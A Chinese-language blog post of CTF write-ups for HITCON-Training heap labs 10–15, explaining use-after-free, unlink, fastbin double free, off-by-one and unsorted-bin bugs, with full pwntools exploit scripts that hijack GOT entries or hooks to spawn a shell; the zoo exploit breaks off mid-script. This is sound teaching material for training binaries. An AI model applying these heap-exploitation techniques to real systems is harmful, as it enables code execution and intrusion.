---
title: HITCON_training题解(二)
date: 2019-04-10 14:47:59
tags: pwn
---

## Lab10——hacknote ##

### 防护 ###

可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

### 分析 ###

本题是一道典型的堆菜单题，共有4个选项

```
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit       
```


<!-- more -->
#### add note ####

逆向可以得到note的结构如下：

```
struct note{
	DWORD *funcptr;
	DWORD *content;
};
```

每次执行add note操作会malloc两个chunk，首先会malloc(0x8)存储note结构体，将指针存在bss段的全局指针数组notelist；然后会根据输入的size，malloc(size)的chunk，并向其中读入size大小的数据。一个指向print_note_content函数的函数指针funcptr和指向存储数据的chunk的指针content会被存储在note结构体中。

#### del note ####

首先读入符合要求的index，如果相应的数组项不为NULL，就会*依次free掉存储content的chunk和存储note的chunk*。注意这里存在UAF漏洞，并没有将notelist上存储的指向note的野指针置为NULL，所以即使在free后我们也可以任意的对这些指针进行解引用。

```c++
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(*((void **)notelist[v1] + 1)); <= uaf vul
    free(notelist[v1]);									<= uaf vul
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

#### print note ####

该功能中会调用note结构体中存储的print_note_content函数指针，打印出content的内容。

```c++
  if ( notelist[v1] )
    (*(void (__cdecl **)(void *))notelist[v1])(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
```



```c
int __cdecl print_note_content(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
```

### 利用 ###

实际上，该题中预留了一个magic函数，直接劫持函数指针到magic函数就可以实现利用。为了实现劫持，我们需要构造一个类型混淆的效果，即能够向note结构体里写内容。因为我们只能向content结构体写，所以我们需要利用uaf漏洞构造一个类似的效果。

首先malloc两个size为0x10的note，然后del掉index0的chunk，此时size为0x8的fastbin中有两个chunk，size为0x10的fastbin中有两个chunk。

```
fd -> note2(chunk2)->note(chunk0)
fd -> content2(chunk3) -> content(chunk1)
```

然后再malloc一个size为0x8的note，就会将两个size为0x8的chunk从fastbin上取下来，而chunk0则作为index2的content，也就是index0的note。所以我们就可以通过向index2的content中写来修改index0的note，也就可以劫持函数指针了。

利用代码如下：

```python
magic = 0x8048986
add("a" * 0x10)
add("b" * 0x10)
del_note(0)
del_note(1)

payload = p32(magic) + p32(0xdeadbeef)
add(payload)
print_note(0)
```

### 提高 ###

我们给该题加大难度，假设不存在magic函数，或者说我们想要直接RCE执行任意指令，那应该怎么办呢？

第一步应该是leak libc，我们可以利用和上述类似的思路，将函数指针覆盖为原来的print_note_content函数，将content覆盖为got表的指针，从而leak出got表。

第二步是将函数指针覆盖为system，将content覆盖为/bin/sh，然后getshell。

这里有两个难点：

- 因为这道菜单题没有edit函数，所以我们可以直接free掉那两个0x8的chunk然后在重新申请的时候布置堆块内容即可。
- 如果直接输入/bin/sh，由于前面有一些杂乱的数据，会使得shell命令执行失败。我们可以用"||"或者";"截断，然后直接用sh即可。因为有些环境中，/bin本来就在环境变量中，所以直接用sh也可以。这里如果用`;/bin/sh\x00`，就会超过8个byte，所以我们只能用`;sh\x00`碰碰运气。幸运的是，我们成功了。

完整exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./hacknote")
p = process("./hacknote")

def add(content):
	p.recvuntil("choice :")
	p.sendline("1")
	p.recvuntil("size :")
	p.sendline(str(len(content)))
	p.recvuntil("Content :")
	p.send(content)

def del_note(index):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(index))

def print_note(index):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(index))

print_ = 0x804865b
got = elf.got['__libc_start_main']
add("a" * 0x10)
add("b" * 0x10)
del_note(0)
del_note(1)

payload = p32(print_) + p32(got)
add(payload)

print_note(0)

addr = u32(p.recvuntil("\xf7")[-4:])
libc.address = addr - libc.symbols['__libc_start_main']
system = libc.symbols['system']

del_note(2)
payload = p32(system) + ";sh\x00"
add(payload)
print_note(0)
p.interactive()	
```

## Lab11——Bamboobox ##

### 防护 ###

该题终于是一道64位的题了，仍旧开启了canary和nx，没有开启pie。

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab11$ checksec bamboobox
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab11/bamboobox'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

### 分析 ###

仍旧是标准菜单题，该题有五个功能，即增删改查和退出。

该题漏洞位于change_item函数中：

虽然在申请chunk的时候是根据输入的size进行malloc操作，但并没有存储size，所以在change的时候未对size进行校验，而是根据此次指定的长度对堆进行写入，也就是存在一个潜在的堆任意写漏洞。

```c++
unsigned __int64 change_item()
{
  int v0; // ST08_4
  int v2; // [rsp+4h] [rbp-2Ch]
  char buf; // [rsp+10h] [rbp-20h]
  char nptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, &buf, 8uLL);
    v2 = atoi(&buf);
    if ( *(_QWORD *)&itemlist[4 * v2 + 2] )
    {
      printf("Please enter the length of item name:", &buf);
      read(0, &nptr, 8uLL);
      v0 = atoi(&nptr);
      printf("Please enter the new name of the item:", &nptr);
      *(_BYTE *)(*(_QWORD *)&itemlist[4 * v2 + 2] + (signed int)read(0, *(void **)&itemlist[4 * v2 + 2], v0)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

该题也是采用全局变量管理堆块指针，将申请chunk的size和对应指针依次存放在bss段。也就是说，如果我们能够修改bss段的指向chunk的指针为任意地址，我们也就可以利用show和edit函数实现任意地址读写。

### 利用 ###

根据上述分析，要实现bss段修改，结合该题的堆溢出漏洞，构造一个unlink利用来使得bss段上的chunk指针向前移动0x18个byte，然后修改chunk指针，实现任意地址读写，从而leak处libc，再劫持atoi@got（malloc_hook和free_hook似乎也可以）为one_gadget从而getshell。

注意unlink利用有如下要点：

- 需要在free时触发前向或后向合并，条件有：
  - free的堆块位于unsorted bin范围内（64位最小为0x80）
  - free的堆块的前一个或后一个堆块未被使用（被free），这根据当前chunk的prev_inuse位判断，并且需要构造prev_size，在当前chunk的地址 - prev_size的位置布置一个fake chunk
  - fake chunk需要保证fake chunk的next chunk的prev_size和自己的size相同
- 野指针需要指向被合并的fake chunk的user_data区间，然后从user_data部分开始构造fake chunk

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./bamboobox")
p = process("./bamboobox")

def add(size, name):
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("name:")
	p.sendline(str(size))
	p.recvuntil("item:")
	p.sendline(name)

def free(index):
	p.recvuntil("choice:")
	p.sendline("4")
	p.recvuntil("item:")
	p.sendline(str(index))

def show(index):
	p.recvuntil("choice:")
	p.sendline("1")

def edit(index, size, name):
	p.recvuntil("choice:")
	p.sendline('3')
	p.recvuntil("item:")
	p.sendline(str(index))
	p.recvuntil("name:")
	p.sendline(str(size))
	p.recvuntil("item:")
	p.send(name)
itemlist = 0x6020c0
one_gadget = 0xf02a4

ptr = itemlist + 0x8
add(0x80, "a" * 0x10)
add(0x10, "b" * 0x10)
add(0x80, "c" * 0x10)
payload = p64(0) + p64(0x61) + p64(ptr - 0x18) + p64(ptr - 0x10)
payload += (0x60 - 0x20) * "a" + p64(0x60)
edit(0, len(payload), payload)

payload = "b" * 0x10 + p64(0xa0) + p64(0x90)
edit(1, len(payload), payload)

free(2)

atoi_got = elf.got['atoi']
# now ptr = 0x6020b0
payload = p64(0) * 2
payload += p64(0) + p64(atoi_got)
edit(0, len(payload), payload)

show(0)
addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))

libc.address = addr - libc.symbols['atoi']
system = libc.symbols['system']

payload = p64(one_gadget + libc.address)
edit(0, len(payload), payload)

p.recvuntil(":")
p.sendline("any")
p.interactive()	
```

## Lab12——secretgarden ##

### 防护 ###

和Lab11类似，也没有开启pie。

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab12$ checksec secretgarden
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab12/secretgarden'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 分析 ###

主要功能有add, visit, del和clean。

#### add ####

这里我们通过逆向得到flower结构体的结构为：

```
struct flower{
	+0x0 DWORD inuse; // 初始化之后会置为1
  +0x8 char* name;
  +0x10 char[24] color; // 通过scanf（"%23s"）输入，说明至少为23位
}
```

add函数中，首先判断flowercount是否大于0x63，是则直接退出。然后malloc一个0x28的chunk，并均初始化为0。然后用scanf读入name的长度，这里检查长度size不为-1，防止整数溢出。然后malloc(size)的chunk，再读入name和color。最后会存储在flowerlist上，并将flowercount自增1

```c++
int add()
{
  void *v0; // rsi
  size_t size; // [rsp+0h] [rbp-20h]
  void *s; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  s = 0LL;
  buf = 0LL;
  LODWORD(size) = 0;
  if ( (unsigned int)flowercount > 0x63 )
    return puts("The garden is overflow");
  s = malloc(0x28uLL);
  memset(s, 0, 0x28uLL);
  printf("Length of the name :", 0LL, size);
  if ( (unsigned int)__isoc99_scanf("%u", &size) == -1 )
    exit(-1);
  buf = malloc((unsigned int)size);
  if ( !buf )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  printf("The name of flower :", size);
  v0 = buf;
  read(0, buf, (unsigned int)size);
  *((_QWORD *)s + 1) = buf;
  printf("The color of the flower :", v0, size);
  __isoc99_scanf("%23s", (char *)s + 16);
  *(_DWORD *)s = 1;
  for ( HIDWORD(size) = 0; HIDWORD(size) <= 0x63; ++HIDWORD(size) )
  {
    if ( !*(&flowerlist + HIDWORD(size)) )
    {
      *(&flowerlist + HIDWORD(size)) = s;
      break;
    }
  }
  ++flowercount;
  return puts("Successful !");
}
```

#### del ####

会根据输入的index，将对应flowerlist中的flower结构体的inuse置为0，然后free掉name的chunk，注意这里存在uaf漏洞，而且没有free flower结构体堆块

```c++
int del()
{
  int result; // eax
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !flowercount )
    return puts("No flower in the garden");
  printf("Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0x63 && *(&flowerlist + v1) )
  {
    *(_DWORD *)*(&flowerlist + v1) = 0;
    free(*((void **)*(&flowerlist + v1) + 1));
    result = puts("Successful");
  }
  else
  {
    puts("Invalid choice");
    result = 0;
  }
  return result;
}
```

#### clean ####

判断对应flower的chunk不为null且inuse标记为0，就free掉flower结构体，然后将flowercount自减1。也就是说，这个函数没有free flower的name的堆块。理论上应该先调用del，再调用clean。

```c++
int clean()
{
  unsigned int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 0x63; ++i )
  {
    if ( *(&flowerlist + i) && !*(_DWORD *)*(&flowerlist + i) )
    {
      free(*(&flowerlist + i));
      *(&flowerlist + i) = 0LL;
      --flowercount;
    }
  }
  return puts("Done!");
}

```

#### visit ####

根据对应flowerlist上对应chunk的inuse位，若inuse位不为0，则输出name和color。

```c++
int visit()
{
  __int64 v0; // rax
  unsigned int i; // [rsp+Ch] [rbp-4h]

  LODWORD(v0) = flowercount;
  if ( flowercount )
  {
    for ( i = 0; i <= 0x63; ++i )
    {
      v0 = (__int64)*(&flowerlist + i);
      if ( v0 )
      {
        LODWORD(v0) = *(_DWORD *)*(&flowerlist + i);
        if ( (_DWORD)v0 )
        {
          printf("Name of the flower[%u] :%s\n", i, *((_QWORD *)*(&flowerlist + i) + 1));
          LODWORD(v0) = printf("Color of the flower[%u] :%s\n", i, (char *)*(&flowerlist + i) + 16);
        }
      }
    }
  }
  else
  {
    LODWORD(v0) = puts("No flower in the garden !");
  }
  return v0;
}

```

### 利用 ###

该题目程序功能比较复杂，但是主要漏洞在于对堆块是否被释放的管理逻辑有误。del函数会将指定index的chunk的*inuse置0*，并且将对应的name chunk free掉，但是没有free 指定index的chunk本身。clean函数会将所有inuse位不为0且不为null的chunk free掉。而visit函数会根据inuse位是否为1来决定是否输出对应信息。

注意，该题由于没有setvbuf，所以需要先调用一次add函数将缓冲区申请出来。

注意到，该题在调用del之后，如果不调用clean，将不会从全局数组上删除对应chunk指针，所以存在潜在的double free漏洞。在此构造一个fastbin 2free，实现任意地址分配。

一般来说，通过inuse这种方式判断是否可以free是不安全的，一般都可能存在2free漏洞。

这里要实现任意地址分配，需要控制size。我们需要在想改的got表覆盖找一个地址，size在fastbin范围内，在got表前面一个byte一个byte的查看字节偏移，找到0x601fffa为合适的地址

```
gef➤  x/32gx 0x601ffa
0x601ffa:	0x1e28000000000000	0x0168000000000060
0x60200a:	0x0ee000007fd5662b	0x34f000007fd5660a
0x60201a <free@got.plt+2>:	0xe69000007fd565d4	0x07b600007fd565d2
0x60202a <__stack_chk_fail@got.plt+2>:	0x4800000000000040	0x197000007fd565d1
0x60203a <memset@got.plt+2>:	0xb20000007fd565e3	0x68e000007fd565d8
0x60204a <close@got.plt+2>:	0x625000007fd565db	0xf74000007fd565db
0x60205a <__libc_start_main@got.plt+2>:	0x43c000007fd565cd	0x313000007fd565cf
0x60206a <malloc@got.plt+2>:	0xee7000007fd565d4	0x603000007fd565d2
0x60207a <open@got.plt+2>:	0x5e8000007fd565db	0xa4d000007fd565cf
0x60208a <__isoc99_scanf@got.plt+2>:	0x088600007fd565d2	0x0000000000000040
0x60209a:	0x0000000000000000	0x0000000000000000
0x6020aa:	0x0000000000000000	0x0000000000000000
0x6020ba:	0x4620000000000000	0x000000007fd56608
0x6020ca:	0x0000000000030000	0x0000000000000000
0x6020da:	0x4010000000000000	0x507000000000017f
0x6020ea <flowerlist+10>:	0x50c000000000017f	0x000000000000017f


```

由fastbin数组索引计算的宏定义可知，高四位不影响size的大小。

```
#define fastbin_index(sz) \
	((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)

```

在分配到该位置后，复写got表即可实现利用，exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./secretgarden")
p = process("./secretgarden")

def add(size, name, color):
	p.recvuntil("choice : ")
	p.sendline("1")
	p.recvuntil("name :")
	p.sendline(str(size))
	p.recvuntil("flower :")
	p.send(name)
	p.recvuntil("flower :")
	p.sendline(color)

def visit():
	p.recvuntil("choice : ")
	p.sendline("2")

def del_(index):
	p.recvuntil("choice : ")
	p.sendline("3")
	p.recvuntil("garden:")
	p.sendline(str(index))

def clean():
	p.recvuntil("choice : ")
	p.sendline("4")

magic = 0x400c7b

add(0x50, "a", "aaaa")
add(0x50, "b", "bbbb")
add(0x50, "c", "cccc")

# 1->2->1
del_(1)
del_(2)
del_(1)

addr = 0x601ffa
freegot = elf.got['free']

add(0x50, p64(addr), "fake")
add(0x50, "d", "dddd")
add(0x50, "e", "eeee")
add(0x50,"a"*6 + p64(0) + p64(magic) * 2 ,"red") #malloc in fake_chunk

p.interactive()	

```



### 提高 ###

#### leak libc ####

leak libc最简单的方法之一，就是使用unsorted bin攻击，将free后的unsorted bin，直接malloc，这不会改变其中泄漏出的libc地址。通过overlapping，或者修改inuse等辅助变量，也都可能实现leak libc。这里我们使用unsorted bin攻击直接leak libc。

#### 劫持控制流 ####

我们通过复写`__malloc_hook`的got表即可实现利用，在libc上，`__malloc_hook`紧挨着main_arena（已经leak得到main_arena+0x88的地址）。我们仍然通过上述调整偏移的方法，寻找某个`__malloc_hook`之前合法的地址。

```
gef➤  x/32gx 0x7fdaa8a46af0 + 5 - 0x8
0x7fdaa8a46aed <_IO_wide_data_0+301>:	0xdaa8a45260000000	0x000000000000007f
0x7fdaa8a46afd:	0xdaa8707e20000000	0xdaa8707a0000007f
0x7fdaa8a46b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7fdaa8a46b1d:	0x0000000000000000	0x0000000000000000


```

可以看到，当分配到如下地址时，size正好为0x7f，即malloc(0x60)的chunk，然后我们将`__malloc_hook`覆盖为one_gadget即可。

#### 触发__malloc_hook ####

这里如果我们直接调用add功能，而在malloc(0x28)时触发malloc_hook，会发现所有的one_gadget地址都不符合要求。这里我们有一个小trick，如果我们对同一个chunk free两次，触发对double free的报错，这时libc代码也会触发_malloc_hook。

```c++
// 两次free同一个chunk，触发报错函数
// 而调用报错函数的时候又会用到malloc-hook，从而getshell
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
			}

```

完整exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./secretgarden")
p = process("./secretgarden")

def add(size, name, color):
	p.recvuntil("choice : ")
	p.sendline("1")
	p.recvuntil("name :")
	p.sendline(str(size))
	p.recvuntil("flower :")
	p.send(name)
	p.recvuntil("flower :")
	p.sendline(color)

def visit():
	p.recvuntil("choice : ")
	p.sendline("2")

def del_(index):
	p.recvuntil("choice : ")
	p.sendline("3")
	p.recvuntil("garden:")
	p.sendline(str(index))

def clean():
	p.recvuntil("choice : ")
	p.sendline("4")
 
add(0x80,"a","aaaa") # 0
add(0x20,"b","bbbb") # 1
del_(0)
clean()

add(0x80,"c","cccc") # 0

visit()
libc_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
offset = 0x3c4b63

libc.address = libc_addr - offset

malloc_hook = libc.symbols['__malloc_hook']
addr = 0x3c4aed + libc.address
one_gadget = 0xf02a4 + libc.address

add(0x60, "a", "aaaa") # 2
add(0x60, "b", "bbbb") # 3

del_(2)
del_(3)
del_(2)

add(0x60, p64(addr), "fake")
add(0x60, "c", "cccc")
add(0x60, "d", "dddd")
add(0x60, 0x13 * "e" + p64(one_gadget),"asdf")
print hex(addr)

del_(2)
del_(2)

p.interactive()

```



## Lab13——heapcreator ##

### 防护 ###

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab13$ checksec heapcreator
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab13/heapcreator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


```

### 分析 ###

该题也是标准的堆题，功能有增删改查。

#### create ####

首先malloc(0x10)的chunk，存储在全局指针数组heaparray上。chunk中记录指向内容的指针和输入的size，

```c++
struct chunk{
  int size; // 0x0
  char *content; // 0x8
};

```

#### edit ####

该功能内存在漏洞，在写入的时候会多写入一位，所以存在off_by_one write漏洞。

```c++
unsigned __int64 edit_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Content of heap : ", &buf);
    read_input(*((void **)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}

```



#### show ####

输出size和content的内容。

#### delete ####

依次free掉content和chunk两个堆块，然后将heaparray全局数组上对应项置为NULL，所以不存在UAF漏洞。

### 利用 ###

​	我们要利用off-by-one写漏洞，实现前向的overlapping，具体方法是，首先申请两个size分别为0x18和0x10的chunk，使得size为0x18的chunk复用下一个chunk的prev_size字段；然后用edit功能修改下个chunk的size字段为\x41（或\x40）都可以，此时调用delete功能，就会向fastbin数组中0x20和0x40的单向链表中分别放入一个chunk，其中0x40的chunk与0x20的chunk形成了重叠，之后的利用就顺理成章了，我们看一下exp。

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./heapcreator")
p = process("./heapcreator")

def create(size, content):
	p.recvuntil("choice :")
	p.sendline("1")
	p.recvuntil("Heap :")
	p.sendline(str(size))
	p.recvuntil("heap:")
	p.send(content)

def edit(index, content):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(index))
	p.recvuntil("heap : ")
	p.send(content)

def show(index):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(index))

def delete(index):
	p.recvuntil("choice :")
	p.sendline("4")
	p.recvuntil("Index :")
	p.sendline(str(index))

create(0x18, "a") # 0 
create(0x10, "b") # 1

# change size
edit(0, "a" * 0x18 + "\x41")

atoi_got = elf.got['atoi']

# push to fastbin
delete(1)
payload = "a" * 0x10 + p64(0) + "\x21".ljust(8,"\x00") + p64(0x30) + p64(atoi_got)
# use overlapping 
create(0x30, payload) # 1

# leak
show(1)

addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc_base = addr - libc.symbols['atoi']
one_gadget = 0xf1147 + libc_base

# hijack got
edit(1, p64(one_gadget))

p.sendline("pwnit")
p.interactive()

```

## Lab14——magicheap ##

### 防护 ###

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab14$ checksec magicheap
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab14/magicheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


```

### 分析 ###

还是增删改查。

当输入4869时，若全局变量magic > 0x1305，则直接cat flag。

漏洞存在于edit功能中，存在一个任意长度的堆溢出。

```c++
unsigned __int64 edit_heap()
{
  size_t v0; // ST08_8
  int v2; // [rsp+4h] [rbp-1Ch]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v2 = atoi(&buf);
  if ( v2 < 0 || v2 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v2] )
  {
    printf("Size of Heap : ", &buf);
    read(0, &buf, 8uLL);
    v0 = atoi(&buf);
    printf("Content of heap : ", &buf);
    read_input(heaparray[v2], v0);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}

```

我们需要利用这个堆溢出漏洞，完成bss段修改的需求。最容易想到的方法应该是直接构造unlink利用。

该题由于提示用unsorted bin attack，unsorted bin attack的利用效果是将任意地址的数修改为一个很大的数，看起来似乎没有什么用，但也至少有如下两个利用场景：

- 我们通过修改循环的次数来使得程序可以执行多次循环。
- 我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。

具体的原理可以去CTF Wiki上看（<https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/>）

我们使用堆溢出，修改相邻的位于unsorted bin中的chunk的bk字段，指向我们想要修改的地址 - 0x10。由于unsorted bin是FIFO，我们只需要malloc一次，就能将目标地址的数修改为main_arena+offset的地址，即一个远远大于0x1305的数，也就实现了利用。

exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./magicheap")
p = process("./magicheap")

def create(size, content):
	p.recvuntil("choice :")
	p.sendline("1")
	p.recvuntil("Heap : ")
	p.sendline(str(size))
	p.recvuntil("heap:")
	p.send(content)

def edit(index, size, content):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(index))
	p.recvuntil("Heap : ")
	p.sendline(str(size))
	p.recvuntil("heap : ")
	p.sendline(content)
	p.send(content)


def delete(index):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(index))

create(0x10, "a")
create(0x80, "b")
create(0x10, "c")

delete(1)
addr = 0x6020c0 - 0x10
payload = "a" * 0x10 + p64(0x20) + p64(0x91) + "aaaaaaaa" + p64(addr)
edit(0, len(payload), payload)
create(0x80, "d") 

p.interactive()

```

## Lab15——zoo ##

### 防护 ###

该题没有开启NX和PIE，只有canary。

```
liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab15$ checksec zoo
[*] '/home/liwc/pwn/HITCON-Training/LAB/lab15/zoo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments


```

### 分析 ###

该题是C++编写的。首先会读入0x64bytes到全局变量nameofzoo。

#### adddog ####

要求输入name和weight，然后new一个0x28的dog对象，调用构造函数初始化，然后向animallist这个vector中插入当前dog对象。

逆向可得Dog类的结构如下：有两个成员函数和两个成员变量，存储name和weight。

```c++
class Dog : Animal{
	void speak();
	void info();
	char name[24];// + 8
	long weight; // + 32
}


```

其中成员函数指向rodata段的vtable。

```
.rodata:0000000000403130 `vtable for'Dog dq 0                    ; offset to this
.rodata:0000000000403138                 dq offset `typeinfo for'Dog
.rodata:0000000000403140 off_403140      dq offset Dog::speak(void)
.rodata:0000000000403140                                         ; DATA XREF: Dog::Dog(std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,int)+1F↑o
.rodata:0000000000403148                 dq offset Dog::info(void)
.rodata:0000000000403150                 public `vtable for'Animal ; weak

```

Dog的构造函数中存在堆溢出漏洞，由于直接使用strcpy。

```c++
unsigned __int64 adddog(void)
{
  __int64 dog; // rbx
  int weight; // [rsp+Ch] [rbp-74h]
  __int64 v3; // [rsp+10h] [rbp-70h]
  __int64 v4; // [rsp+18h] [rbp-68h]
  char v5; // [rsp+20h] [rbp-60h]
  char name; // [rsp+40h] [rbp-40h]
  unsigned __int64 v7; // [rsp+68h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v5);
  std::operator<<<std::char_traits<char>>(&std::cout, "Name : ");
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&edata, &v5);
  std::operator<<<std::char_traits<char>>(&std::cout, "Weight : ");
  std::istream::operator>>(&edata, &weight);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&name, &v5);
  dog = operator new(0x28uLL);
  Dog::Dog(dog, (__int64)&name, weight);
  v4 = dog;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&name);
  v3 = v4;
  std::vector<Animal *,std::allocator<Animal *>>::push_back(&animallist, &v3);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v5);
  return __readfsqword(0x28u) ^ v7;
}

```

#### addcat ####

和adddog完全一样，只不过new的是cat对象，同样push_back到animallist中。

#### listen ####

首先检查animallist的size是否为0，是则直接退出。然后若index合法，则直接调用相应animal的speak函数。这里不难想到，如果我们可以劫持vtable，也就可以劫持控制流了。

#### show ####

同上，也是调用对象的成员函数。打印出对象的name和info字段。

#### remove ####

首先delete掉animallist上对应index的对象，然后erase掉vector上相应项。

### 利用 ###

这里主要的难点是获取覆盖虚表指针的偏移，可以用gdb调试获得。

```
gef➤  x/32gx 0x0000000001263c20
0x1263c20:	0x0000000000403140	0x0000000031676f64
0x1263c30:	0x0000000000000000	0x0000000000000000
0x1263c40:	0x0000000000000028	0x0000000000000021
0x1263c50:	0x0000000000000000	0x0000000000000000
0x1263c60:	0x0000000000000000	0x0000000000000031
0x1263c70:	0x0000000000403140	0x0000000032676f64
0x1263c80:	0x0000000000000000	0x0000000000000000
0x1263c90:	0x0000000000000028	0x0000000000000021
0x1263ca0:	0x0000000001263c20	0x0000000001263c70
0x1263cb0:	0x0000000000000000	0x0000000000020351
0x1263cc0:	0x0000000000000000	0x0000000000000000
0x1263cd0:	0x0000000000000000	0x0000000000000000
0x1263ce0:	0x0000000000000000	0x0000000000000000
0x1263cf0:	0x0000000000000000	0x0000000000000000
0x1263d00:	0x0000000000000000	0x0000000000000000
0x1263d10:	0x0000000000000000	0x0000000000000000


```

可以看到0x1263c70处是要覆盖的虚表地址，而我们是从0x1263c28处开始写，所以需要padding 9 * 0x8 bytes。

直接在读入zooname时在bss段布置好shellcode和fake vtable，最后直接覆盖vtable即可。

完整exp如下：

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./zoo")
p = process("./zoo")

def adddog(name, weight):
